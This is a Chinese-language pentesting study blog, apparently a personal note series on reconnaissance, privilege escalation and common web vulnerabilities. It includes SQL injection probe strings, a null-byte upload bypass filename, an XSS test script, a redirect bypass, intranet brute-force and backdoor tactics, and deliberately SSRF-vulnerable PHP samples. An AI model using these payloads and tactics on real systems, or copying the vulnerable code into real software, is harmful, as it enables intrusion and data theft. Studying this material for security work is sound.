color="#FF0000">信息搜集</font></h1><hr><ol><li>主要目标：Web应用程序的whois信息、Web程序的开发框架和模板、Web程序的路径信息以及web服务器的服务信息等等.<br>①目标信息系统组成：Web应用信息、操作系统与服务、网络结构、其他<br>②Web服务器网络信息：web服务器C段、Web服务器防护情况<br>③Web应用程序信息：Web应用中间件、Web应用使用的框架和模板、Web应用路径信息、Web应用敏感文件、Web应用使用的第三方插件</li><li>作用：根据整个渗透测试方案的目标，直接、高效的收集目标信息系统数据进行分析，发现目标信息系统潜在的弱点。<br>①Web应用程序域名信息：whois注册信息(管理员电话、邮箱)、Web程序子域名、NX记录、NX记录<br>②Web应用程序其他信息：网站服务信息(QQ、邮箱、电话)、网络所属公司信息、网站公司员工敏感信息(邮箱、电话、github)、公众号、APP</li><li>信息搜集方法与工具：<br>①Web应用：web中间件信息、web应用程序信息<br>②服务器：服务器各种服务信息<br>③网络：网络信息-C段、DNS<br>④其他：Whios、邮箱等其他信息</li></ol><p><img src="https://s2.ax1x.com/2019/03/05/kjttl6.png" alt="image"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a><font color="#FF0000">提权</font></h1><hr><ol><li>介绍：就是提高自己在服务器中的权限，比如在windows中你本身登录的用户是guest，然后通过提权后就变成超级管理员，拥有了管理windows的所有权限。提权是黑客的专业名词，一般用于网站入侵和系统入侵。</li><li>提权类型和方法：<br>①操作系统提权：windows(pr、mimikatz)、linux(脏牛)<br>②数据库漏洞提权:mysql提权(udf)、sqlserver提权<br>③应用程序漏洞提权：servu提权、pcanywhere提权<br>④其他提权方式：第三方组件提权、文件系统权限配置不当提权</li></ol><h1 id="加密"><a href="#加密" class="headerlink" title="加密"></a><font color="#FF0000">加密</font></h1><hr><ol><li><p>md5：<br>①特点：<img src="https://s2.ax1x.com/2019/03/07/kxfAhR.png" alt="image"><br>②破解原理：计算出各种排列组合的字符对应的MD5值，然后根据需要解密的MD5值进行反推。<br>③常用在线破解网站：<br> <a href="http://www.cmd5.com\www.xmd5.org\www.pmd5.com" target="_blank" rel="noopener">www.cmd5.com\www.xmd5.org\www.pmd5.com</a></p></li><li><p>base64:不是加密，而是一种编码方式。</p></li></ol><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a><font color="#FF0000">内网渗透</font></h1><hr><ol><li>介绍：拿到企业或者公司的内网权限，然后从内网得到最有价值的战果。</li><li>技术问题：1、防火墙穿透；2、木马免杀穿透；3、内网信息收集及目标定位；4、关于文件下载</li><li>思路：进入内网或者拿到服务器权限之后首先我会用nmap或者IIS PUT Scaner探测一下内网IP段开放的端口和服务，如果是WEB服务就通过常规的WEB渗透黑入系统，如果是数据库、FTP通地批量暴破弱口令进入（因为内网都是最薄弱的地方，而且开发人员的数据库都为了方便，设置为弱口令，一般扫描数据库成功率很大），ARP欺骗（这个动作会很大，一般不建议使用）等等。可以看看域内的管理员有谁，最后登录时间，有没有home dir里有脚本的，边界服务器都有哪些（那种可以通内网和外网的），然后找立足点，留后门等都做好了，再突破搞内网。扫端口是可以的，先net group找到服务器组(邮件/WEB/)，然后扫那个段的常见端口。话说nmap可以命令行下安装，不过win下的nmap不好用呢，linux下比较顺手~nmap很容易引起管理员警觉的，特别是加了scripts。如果是工作组，你可以nbtscan扫下看机器名，或者netscan扫扫开放的共享（图形界面）。</li><li>信息获取途径：通过域名暴破、搜索引擎、挖掘公司企业相关网站最终找到突破口、社工企业人员账号或QQ号等相关信息等等。</li><li>内网小工具：pstools、hijack、metaspliot、nmap、PowerEmpire、IIS PUT Scaner、mysql与sqlserver弱口令暴破工具（通过python编写）、hydra（SSH暴破工具）、FTPscan（python脚本实现）、Ettercap（嗅探工具）。</li><li>危害：影响到公司内部代码泄露与重要信息泄露等等啦,包括代码、数据库、人员、邮件、架构信息等信息都会泄漏，基本上公司裸奔了。</li></ol><p>#未完待续……</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试介绍与实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试介绍 </tag>
            
            <tag> 信息搜集 </tag>
            
            <tag> 提权 </tag>
            
            <tag> 加密 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>常见漏洞分析</title>
      <link href="/2019/03/04/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2019/03/04/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<center><font color="#4094C7" size="4">常见漏洞分析介绍</font></center><h1 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a><font color="#FF0000">SQL注入漏洞</font></h1><hr><ol><li>介绍：SQL注入是恶意用户通过把精心构造的SQL语句当做查询参数的一部分提交给Web服务器应用程序，最终欺骗服务器执行恶意的SQL命令并导致用户信息泄露甚至是服务器被控制的漏洞。<br><img src="https://s2.ax1x.com/2019/03/05/kj36Nq.png" alt="image"></li><li>判断是否存在注入：(and 1=1 / and 1=2)</li><li>判断有多少列:(order by n)</li><li>判断数据显示点:(union select 1,2,3,…)</li><li>查看数据库基本信息:(union select 1,version(),database())</li></ol><h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a><font color="#FF0000">文件上传漏洞</font></h1><hr><ol><li>文件上传流程：前端校验-&gt;http协议传输-&gt;web应用程序校验-&gt;web应用程序储存-&gt;web应用程序解析执行<br><img src="https://s2.ax1x.com/2019/03/05/kXTmRI.png" alt="image"></li><li>类型分析：<br>①任意文件上传：Web应用系统没有对用户上传的文件做任何校验就直接上传到Web服务器。恶意用户可以直接上传一句话木马到Web服务器，从而控制Web服务器。 (开发人员测试代码没有删除、上传文件经过压缩编码、通过特定的客户端上传，如APP)<br>②绕过js检验上传：Web应用系统虽然对用户上传的文件进行了校验，但是校验是通过前端javascript代码完成的。由于恶意用户可以对前端javascript进行修改或者是通过抓包软件篡改上传文件，就会导致基于js的校验很容易被绕过。绕过方法有：修改前端JavaScript、使用Burp Suite篡改上传的文件。<br>③后端上传代码校验绕过：一般根据绕过Web应用校验的方法可以分为：绕过文件类型校验(部分Web应用系统判定文件类型是通过content-type字段，测试人员可以通过抓包，将content-type字段改为常见的图片类型，如image/gif，从而绕过校验)、绕过扩展名验证(一般针对黑名单的Web应用系统。黑名单检测方式一般有个专门的blacklist文件或者列表，里面会包含常见的危险脚本文件类型，所有在黑名单中的文件都不允许上传。)、绕过文件头校验(Web应用程序在检验文件类型、文件扩展名的同时，也会校验文件头，从而进一步确定文件的类型。针对这种情况，可以通过在上传的一句话木马文件的开头加入特定的文件头从而绕过这种验证方式)。<br><img src="https://s2.ax1x.com/2019/03/05/kXLZvR.png" alt="image"><br><img src="https://s2.ax1x.com/2019/03/05/kXLfaT.png" alt="image"><br>④结合00截断：在上传文件的时候，web应用程序经过一系列文件校验之后，最终调用php的内置函数move_uploaded_file保存文件。在某些版本的PHP下，该函数遇到\x00字符后悔截断路径名。测试人员通过构造包含\x00的特殊文件名就可以通过上传文件的扩展名校验，但是保存时却以非法的扩展名保存文件。(如上传文件名为”test.php\x00.jpg”这类文件可以通过文件类型必须是jpg校验，但最终在调用move_uploaded_file时遇到了\x00所以保存成了test.php)<br>⑤结合解析漏洞：Web中间件遇到特殊类型的文件时会被当成代码执行。不同的Web中间件触发解析漏洞的文件类型也不同。(IIS6.0:”test.asp;.php”会被IIS6.0当做test.php解析)</li></ol><h1 id="命令注入漏洞"><a href="#命令注入漏洞" class="headerlink" title="命令注入漏洞"></a><font color="#FF0000">命令注入漏洞</font></h1><hr><ol><li>介绍：命令注入漏洞的危害跟web中间件的运行的权限有关。由于web应用运行在web中间件上，所以web应用会“继承”web中间件的运行权限。如果存在命令注入漏洞的web应用运行在以系统管理员身份运行的web中间件上，那么黑客就相当于拥有一个管理员权限的shell。黑客可以利用漏洞任意的执行权限允许的命令(查看系统敏感信息、添加管理员、反弹shell、下载并运行恶意代码)</li><li>命令注入漏洞本质：由于系统把用户输入进来的参数当成了要执行的命令，并且这些命令被执行了，这样就造成了命令注入漏洞。</li><li>命令注入漏洞产生原因：①web网站没有对用户提交的参数进行有效的检测过滤 ②操作系统运行一条语句执行多条命令(使用连接符和管道符)</li><li><p>连接符和管道符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">command1  &amp; command2  :  先后执行command1 和 command2，无论command1执行是否成功</span><br><span class="line">command1 &amp;&amp; command2  :  先后执行command1 和 command2，只有command1执行成功时才执行command2</span><br><span class="line">command1 || command2  :  先后执行command1 和 command2，只有command1执行失败时才执行command2</span><br><span class="line">command1  | command2  :  |是管道符，将command1的执行结果传递给command2</span><br></pre></td></tr></table></figure></li><li><p>漏洞利用流程：查找可以执行命令的接口-&gt;判断是否存在命令注入-&gt;查看当前系统当前信息-&gt;查看当前用户权限-&gt;添加新用户或者反弹shell-&gt;控制目标服务器<br><img src="https://s2.ax1x.com/2019/03/05/kjttl6.png" alt="image"><br><img src="https://s2.ax1x.com/2019/03/05/kjtXBF.png" alt="image"></p></li></ol><h1 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a><font color="#FF0000">XSS漏洞</font></h1><hr><ol><li>介绍：XSS攻击全称：跨站脚本攻击，是为不和层叠样式表的缩写混淆，故意将跨站脚本攻击写成XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中，从而导致各种安全问题，如cookie泄漏、网站挂马。<br><img src="https://s2.ax1x.com/2019/03/06/kvio3q.png" alt="image"></li><li>XSS的原理是web应用程序混淆了用户提交的数据和js脚本的代码边界，导致浏览器把用户的输入当成了JS代码来执行</li><li>分类：<br>反射型：非持久型XSS，也就是攻击相对于受害者而言的一次性的，具体表现在受害者点击了含有的恶意JavaScript脚本的url，而Web应用程序只是不加处理的把恶意脚本“反射”回受害者的浏览器而使受害者的浏览器执行相应的脚本。<br><img src="https://s2.ax1x.com/2019/03/06/kvkWfs.png" alt="image"><br>存储型：持久型XSS，攻击者上传的包含恶意js脚本的留言等消息被Web应用程序保存到数据库中，Web应用程序在生成新的页面的时候如果包含了该恶意js脚本，这样会导致所有访问该网页的浏览器执行该恶意js脚本。这种攻击类型常见在博客、论坛等网站。<br>DOM型：DOM是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构及样式。DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞，而且不需要与服务端进行交互。客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。</li><li>发现和利用：<br>反射型XSS：可以查看代码，查找关键的变量，假如用户提交的变量经过htmlEncode处理就返回，那么这个变量就很有可能存在一个反射型XSS漏洞。<br>存储型XSS：一般需要查找像留言板、发帖等网站功能，然后在留言板、帖子中插入<script>alert(“XSS”)</script>之类的测试代码。在提交成功后，可以在访问之前发布的留言或者帖子，如果弹窗了，可以那么这个位置就存在一个存储型XSS漏洞。<br>DOM型XSS：不与服务器进行交互，因此我们一般挖掘此类漏洞需要分析javascript代码。如果是自定义函数，则需要一步一步来把对方自定义的函数来搞清楚。</li><li>自动化检测XSS漏洞:在实际的渗透测试中，往往为了加快测试进度，我们可以使用一些自动化的XSS检测工具(Awvs、AppScan、w3af、XSSer、XSSF)。</li><li>XSS利用工具：BlueLotus_XSSReceiver搭建的XSS平台、XSSer.me源码搭建的XSS平台、kali下的BeFF。</li><li>XSS攻击流程：攻击者发现XSS漏洞-&gt;构造代码-&gt;发送给受害人-&gt;受害人打开-&gt;攻击者获取受害人的cookie-&gt;完成攻击</li></ol><h1 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a><font color="#FF0000">CSRF漏洞</font></h1><hr><ol><li>介绍：通过伪装来自受信任用户的请求来利用受信用的网站。攻击者盗用了你的身份，以你的名义发送恶意请求。</li><li>原理：web应用程序在用户进行敏感操作时，如修改账号密码、添加账号、转账时，没有校验表单token或者http请求头中的referer值，从而导致恶意攻击者利用被攻击者的身份完成对应的恶意请求。 CSRF一般用于操作用户的资源，或者使用用户的权限进行操作，或者窃取用户的相关信息。</li><li>CSRF攻击流程：发现漏洞-&gt;构造代码-&gt;发送给受害人-&gt;受害人打开-&gt;受害人执行代码-&gt;完成攻击</li><li>漏洞原理：<br><img src="https://s2.ax1x.com/2019/03/06/kvwCtg.png" alt="image"></li></ol><h1 id="信息泄露类漏洞"><a href="#信息泄露类漏洞" class="headerlink" title="信息泄露类漏洞"></a><font color="#FF0000">信息泄露类漏洞</font></h1><hr><ol><li>目录遍历：Web中间件与网站目录权限配置不当，在网站目录无索引文件(index.html、index.asp、index.php、index.jsp等)的情况下，访问该网站目录时会直接显示该目录下所有的文件及其子目录·。通过对Web中间件进行正确的配置，可以有效的避免这类漏洞。</li><li>目录遍历利用方式：如果发现web应用程序存在目录遍历漏洞，那么可以手动查找该网站的后台地址、备份文件等敏感信息。结合搜索的敏感信息，渗透测试人员可以进行下一步的渗透，如爆破管理员密码、分析网站源码等。</li><li>敏感信息泄露：一切泄露的可能危害Web服务器安全的信息。敏感信息搜集也是渗透测试中至关重要的一环。Web服务器敏感信息泄露会给黑客提供组多的攻击思路，严重威胁Web服务器的安全。一般没有直接危害，但恶意攻击者根据这些信息可以大大增加攻击面。(例：根据404信息可以推断出web中间件是weblogic，使用相关工具检测发现该版本的weblogic存在java反序列化漏洞可以执行的系统命令)</li><li>敏感信息泄露分类：Web服务器敏感信息泄露(Web服务器开放端口、Web服务器开放服务器类型、Web服务器开放服务版本)Web中间价敏感信息泄露(Web中间件类型、Web中间件版本、Web中间件后台地址)Web应用程序敏感信息泄露(Web应用程序脚本程序版本、Web应用程序开发框架、Web应用程序cms类型、Web应用程序后台地址、敏感目录、API等、Web应用程序安装目录信息、Web应用程序开发遗留文件、Web应用程序采用的第三方插件的类型和版本信息、Web应用程序的whois信息)</li><li>敏感信息泄露防御：对Web服务器敏感信息泄露的防御措施(修改安装的服务的默认端口、屏蔽安装的服务的版本信息)，对Web中间件敏感信息泄露的防御措施(屏蔽Web中间件版本信息、修改Web中间件默认的后台地址)，对Web应用程序敏感信息泄露的防御措施(屏蔽采用的网站框架和模板、修改默认网站的后台路径、删除开发遗留的版本控制文件、对网站的whois信息采取隐私保护措施)</li><li>任意文件读取漏洞介绍：一般的网站提供读取文件功能，常规的思路是使用一个动态页面(php、jsp、aspx、asp等)将待下载的文件作为参数，根据不同的参数值下载不同的文件。如果网站配置不当，并且没有对用户下载的文件参数进行有效的过滤检测，恶意用户就会下载任意文件，如web的数据库配置文件等。<br><img src="https://s2.ax1x.com/2019/03/07/kv4La4.png" alt="image"></li><li>任意文件读取漏洞危害：属于一种高位的Web安全漏洞，这种漏洞会泄露网站敏感信息导致网站处于极度不安全状态(下载服务器任意文件，如脚本代码、服务及系统配置文件等)(根据Web应用源代码进一步进行代码审计，得到更多可利用的漏洞)</li><li>任意文件读取漏洞利用：手工挖掘任意文件读取漏洞需要注意网站提供的下载功能。(从链接上看：readfile.php?file=<strong><em>.txt 、 download.php?file+</em></strong>.rar)(从参数名看：RealPath=、FilePath=、inputFile)。找到可以的参数值后，替换下载的文件名为下列敏感的系统文件。如果下载成功，证明存在任意文件读取漏洞。利用任意文件读取漏洞，可以通过分析Web应用程序各个文件之间的调用关系，下载整个Web应用程序源代码。从源代码当中可以分析出数据库账号密码、后台路径等敏感信息，渗透测试人员也可以对网站源代码进行代码审计，深入挖掘各类漏洞。</li></ol><h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a><font color="#FF0000">SSRF漏洞</font></h1><hr><ol><li>介绍：全名为服务端请求伪造，是一种<font color="#FF0000">由攻击者构造形成由服务端发起请求</font>的一种安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内网系统。由于该攻击是由服务端发起的，所以它可以<font color="#FF0000">请求到与它相连而与外网隔离的内部系统</font>。</li><li>成因：SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</li><li>常用的后端实现<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()函数</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123; </span><br><span class="line">    $content = file_get_contents($_POST[<span class="string">'url'</span>]); </span><br><span class="line">    $filename =<span class="string">'./images/'</span>.rand().<span class="string">';img1.jpg'</span>; </span><br><span class="line">    file_put_contents($filename, $content); </span><br><span class="line">    <span class="keyword">echo</span> $_POST[<span class="string">'url'</span>]; </span><br><span class="line">    $img = <span class="string">"&lt;img src=\""</span>.$filename.<span class="string">"\"/&gt;"</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $img;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#这段代码使用 file_get_contents 函数从用户指定的 URL 获取图片。然后把它用一个随机文件名保存在硬盘上，并展示给用户。</span></span><br></pre></td></tr></table></figure></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">fsockopen()函数</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span><span class="params">($host,$port,$link)</span> </span>&#123; </span><br><span class="line">    $fp = fsockopen($host, intval($port), $errno, $errstr, <span class="number">30</span>); </span><br><span class="line">    <span class="keyword">if</span> (!$fp) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$errstr (error number $errno) \n"</span>; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        $out = <span class="string">"GET $link HTTP/1.1\r\n"</span>; </span><br><span class="line">        $out .= <span class="string">"Host: $host\r\n"</span>; </span><br><span class="line">        $out .= <span class="string">"Connection: Close\r\n\r\n"</span>; </span><br><span class="line">        $out .= <span class="string">"\r\n"</span>; </span><br><span class="line">        fwrite($fp, $out); </span><br><span class="line">        $contents=<span class="string">''</span>; </span><br><span class="line">        <span class="keyword">while</span> (!feof($fp)) &#123; </span><br><span class="line">            $contents.= fgets($fp, <span class="number">1024</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        fclose($fp); </span><br><span class="line">        <span class="keyword">return</span> $contents; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#这段代码使用 fsockopen 函数实现获取用户制定 URL 的数据（文件或者 HTML）。这个函数会使用 socket 跟服务器建立 TCP 连接，传输原始数据。</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">curl_exec()函数</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123;</span><br><span class="line">    $link = $_POST[<span class="string">'url'</span>];</span><br><span class="line">    $curlobj = curl_init();</span><br><span class="line">    curl_setopt($curlobj, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">    curl_setopt($curlobj,CURLOPT_URL,$link);</span><br><span class="line">    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    $result=curl_exec($curlobj);</span><br><span class="line">    curl_close($curlobj);</span><br><span class="line"></span><br><span class="line">    $filename = <span class="string">'./curled/'</span>.rand().<span class="string">'.txt'</span>;</span><br><span class="line">    file_put_contents($filename, $result); </span><br><span class="line">    <span class="keyword">echo</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#使用 curl 获取数据。</span></span><br></pre></td></tr></table></figure><ol start="4"><li>分析举例：html，php，asp，jsp 具有这些文件后缀的文件通常储存在web服务器（网站服务器）中，而且web服务器都具有独立ip。而网站访问的大致步骤：用户在地址栏输入网址 -&gt; 向目标网站发送请求 -&gt; 目标网站接受请求并在服务器端验证请求是否合法，然后返回用户所需要的页面 -&gt; 用户接收页面并在浏览器中显示。<br><img src="https://s2.ax1x.com/2019/03/20/AKpeJJ.png" alt="image"></li><li>SSRF漏洞寻找：通过URL地址分享网页内容、转码服务、在线翻译、图片加载与下载(通过URL地址加载或下载图片)、图片和文章收藏功能、未公开的api实现以及其他调用URL的功能、从URL关键字中寻找(share\wap\url\link\src\source\target\u\3g\display\sourceURl\imageURL\domain…)</li><li>验证方法:<br>①因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的来判断是否存在SSRF漏洞。<br>②在页面源码中查找访问的资源地址 ，如果该资源地址类型为 [<a href="http://www.xxx.com/a.php?image=（地址）]的就可能存在SSRF漏洞。" target="_blank" rel="noopener">http://www.xxx.com/a.php?image=（地址）]的就可能存在SSRF漏洞。</a><br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1553057970500&amp;di=98f30b7b750b4399aedb022c28b55f09&amp;imgtype=0&amp;src=http%3A%2F%2Fwww.0xby.com%2Fwp-content%2Fuploads%2F2018%2F07%2F0b9ec48620df953ea1787289eb1a22f4.jpg" alt="image"></li></ol><h1 id="DNS-rebinding攻击"><a href="#DNS-rebinding攻击" class="headerlink" title="DNS rebinding攻击"></a><font color="#FF0000">DNS rebinding攻击</font></h1><hr><ol><li>介绍：DNS重定向攻击，同源策略要求在同一个域下面的东西不会引用其它域的内容，但是！！这个规则不适用于（script,link,iframe,img）等标签的SRC属性。这也是为什么同源规则无法防止挂马的根本原因。我们通过欺诈的手段把你在站点A的资源引入到站点B上</li><li>案例分析：<br>①弄一个域名，比如<a href="http://www.badguy.com/" target="_blank" rel="noopener">http://www.badguy.com/</a><br>②瞄准一个目标，例如<a href="http://www.victim.com/" target="_blank" rel="noopener">http://www.victim.com/</a><br>③把<a href="http://www.badguy.com/的TTL注册为一个很短的时间，例如1秒" target="_blank" rel="noopener">http://www.badguy.com/的TTL注册为一个很短的时间，例如1秒</a><br>④然后，在<a href="http://www.victim.com/注册个帐号，登录之后，在个人主页之类的地方上传些坏东西(例如木马，不过场景是假设的，所以可能会不成功哦，奉劝大家也别想着干坏事了:p)" target="_blank" rel="noopener">http://www.victim.com/注册个帐号，登录之后，在个人主页之类的地方上传些坏东西(例如木马，不过场景是假设的，所以可能会不成功哦，奉劝大家也别想着干坏事了:p)</a><br>⑤登录<a href="http://www.victim.com/的时候选择记住密码，然后查看cookie的信息，把记录登录信息的那段信息截出来。写一段JS放到http://www.badguy.com/,让访问的用户都会保留这段cookie信息到http://www.badguy.com/的域名下。" target="_blank" rel="noopener">http://www.victim.com/的时候选择记住密码，然后查看cookie的信息，把记录登录信息的那段信息截出来。写一段JS放到http://www.badguy.com/,让访问的用户都会保留这段cookie信息到http://www.badguy.com/的域名下。</a><br>⑥让用户访问<a href="http://www.badguy.com/，之后用脚本控制这个用户在2秒后(&gt;TTL时间)重定向到http://www.badguy.com/,在这段时间内我们需要马上关闭DNS服务器，并且把http://www.victim.com/的IP绑定到http://www.badguy.com/上，好了，两秒之后，如无意外，这个用户会访问到http://www.victim.com/上的你的登录页，如果有木马，就会中招。" target="_blank" rel="noopener">http://www.badguy.com/，之后用脚本控制这个用户在2秒后(&gt;TTL时间)重定向到http://www.badguy.com/,在这段时间内我们需要马上关闭DNS服务器，并且把http://www.victim.com/的IP绑定到http://www.badguy.com/上，好了，两秒之后，如无意外，这个用户会访问到http://www.victim.com/上的你的登录页，如果有木马，就会中招。</a></li></ol><h1 id="远程代码执行漏洞"><a href="#远程代码执行漏洞" class="headerlink" title="远程代码执行漏洞"></a><font color="#FF0000">远程代码执行漏洞</font></h1><hr><ol><li>介绍：用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。</li><li>漏洞原理：由于开发人员编写源码，没有针对代码中可执行的特殊函数入口做过滤，导致客户端可以提交恶意构造语句提交，并交由服务器端执行。命令注入攻击中WEB服务器没有过滤类似system(),eval()，exec()等函数是该漏洞攻击成功的最主要原因。像堆溢出，栈溢出，整型溢出，类型混淆，use after free，访问越界，格式化字符串等都会导致远程代码执行。</li><li>危害：命令执行，对于攻击者来说是打开缺口的绝好方法，可长驱直入控制内网，甚至脱裤。攻击者可以通过远程调用的方式来让被攻击计算机设备执行恶意程序，从而控制远程计算机。</li><li>防御：开发程序时，要假定所有的输入都是可疑的，尝试对所有输入提交可能执行命令的构造语句进行严格的检查或者控制外部的输入，系统命令执行函数的参数不允许外部传递。简单来说，卡住入口点很关键。对输入的数据不仅要验证数据的类型，还要验证其格式、长度、范围和内容。</li><li>案例分析：wooyun上的三星默认输入法远程代码执行。攻击前提是攻击者能够劫持流量：首先，该输入法在更新语言包时，对下载的文件校验不严格，没有签名，中间人可以同时篡改下载文件和对应的hash值绕过校验；然后，语言压缩包中的文件是由 system user写入的，有很高的权限，可以写入很多位置；再者，odex文件完整性校验机制有问题，只是校验odex文件的crc32和modify time；由以上第二点，包含在语言zip包中的恶意odex文件就可以覆盖/data/dalvik-cache/目录下的odex；由第三点，保证恶意odex的crc32和modify time和源odex文件一致，绕过odex文件校验，以system user权限执行恶意的odex。</li></ol><h1 id="url重定向攻击"><a href="#url重定向攻击" class="headerlink" title="url重定向攻击"></a><font color="#FF0000">url重定向攻击</font></h1><hr><ol><li>介绍：通过以GET或者POST的方式接收将要跳转的URL，然后通过上面的几种方式的其中一种来跳转到目标URL。一方面，由于用户的输入会进入Meta，javascript，http头所以都可能发生相应上下文的漏洞，如xss等等，但是同时，即使只是对于URL跳转本身功能方面就存在一个缺陷，因为会将用户浏览器从可信的站点导向到不可信的站点，同时如果跳转的时候带有敏感数据一样可能将敏感数据泄漏给不可信的第三方。<br><img src="https://s2.ax1x.com/2019/03/20/AlfX8O.png" alt="image"></li><li>攻击方式和危害：恶意用户完全可以借用URL跳转漏洞来欺骗安全意识低的用户，从而导致“中奖”之类的欺诈，这对于一些有在线业务的企业如淘宝等，危害较大，同时借助URL跳转，也可以突破常见的基于“白名单方式”的一些安全限制，如传统IM里对于URL的传播会进行安全校验，但是对于大公司的域名及URL将直接允许通过并且显示会可信的URL，而一旦该URL里包含一些跳转漏洞将可能导致安全限制被绕过。如果引用一些资源的限制是依赖于“白名单方式”，同样可能被绕过导致安全风险，譬如常见的一些应用允许引入可信站点如youku.com的视频，限制方式往往是检查URL是否是youku.com来实现，如果youku.com内含一个url跳转漏洞，将导致最终引入的资源属于不可信的第三方资源或者恶意站点，最终导致安全问题。这种漏洞一般都是配合钓鱼网站使用。<br><img src="https://s2.ax1x.com/2019/03/20/AlhIW8.png" alt="image"><br><img src="https://s2.ax1x.com/2019/03/20/AlhOwn.png" alt="image"></li><li>突破技巧：当某参数为（url=<a href="http://xxxx.cn）时可以尝试url重定向，但是多大数都会失败，我们可以使用@突破。例如：（url=http://xxx.cn@www.baidu.com）" target="_blank" rel="noopener">http://xxxx.cn）时可以尝试url重定向，但是多大数都会失败，我们可以使用@突破。例如：（url=http://xxx.cn@www.baidu.com）</a> 发现可以实现跳转。</li></ol><h1 id="XML注入攻击"><a href="#XML注入攻击" class="headerlink" title="XML注入攻击"></a><font color="#FF0000">XML注入攻击</font></h1><hr><ol><li>介绍：XML指可扩展标记语言，XML被设计用来传输和存储数据。XML注入一般指在请求XML数据中插入攻击利用代码。攻击者对XML插入了一些恶意构造的数据或者一些payload。</li><li>形成漏洞形式：xee XML Entity Expansion；xxe XXE Injection即XML External Entity Injection；soap注入；XPath注入</li><li>XML注入攻击方式：XML数据注入（XML Data Injection)；XML外部实体注入(XML External Entity)  XXE；可扩展样式表语言转换（Extensible Stylesheet Language Transformation，XSLT）注入；XPath/XQuery注入；SOAP webservice注入等。</li><li>危害：通过构造恶意内容，可导致权限绕过及伪造、读取任意文件、执行系统命令、探测内网端口（SSRF等）、攻击内网网站等危害。还可能有DOS，也就是xee漏洞。soap注入的话，那么就是数据丢失。</li></ol><h1 